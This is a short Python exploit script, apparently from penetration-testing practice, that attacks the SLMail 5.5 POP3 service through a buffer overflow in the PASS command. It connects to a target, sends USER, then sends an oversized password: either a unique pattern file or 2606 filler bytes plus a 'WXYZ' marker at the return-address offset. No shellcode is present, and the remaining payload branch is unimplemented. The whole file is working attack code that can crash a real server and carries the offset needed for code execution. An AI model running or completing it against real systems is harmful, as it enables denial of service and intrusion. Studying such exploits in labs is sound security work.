#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" slmail.py

Pwn SLMail with a buffer overflow.

"""

from __future__ import division, print_function, absolute_import

import socket

def pwn(ip, port, payload):
    """ Pwn SLMail 5.5 with a buffer overflow attack

    """
    timeout = 120
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    if payload == 'unique':
        with open('data/unique_2700byte_string.dat') as unique:
            buff = unique.read()
    elif payload == 'test':
        buff = 'A' * 2606 + 'WXYZ' + 'C' * 90
    else:
        print("[*] Attack not yet implemented... aborting")

    try:
        print("[*] Sending evil buffer...")
        s.connect((ip, int(port)))
        data = s.recv(1024)
        s.send('USER username' + '\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buff + '\r\n')
        print("[*] Buffer sent")
    except socket.timeout:
        print("[*] ERROR: Socket timeout at {} seconds... aborting".format(timeout))
    except socket.error:
        print("[*] ERROR: Cannot connect to POP3 on IP {}:{}".format(ip, port))

    s.close()
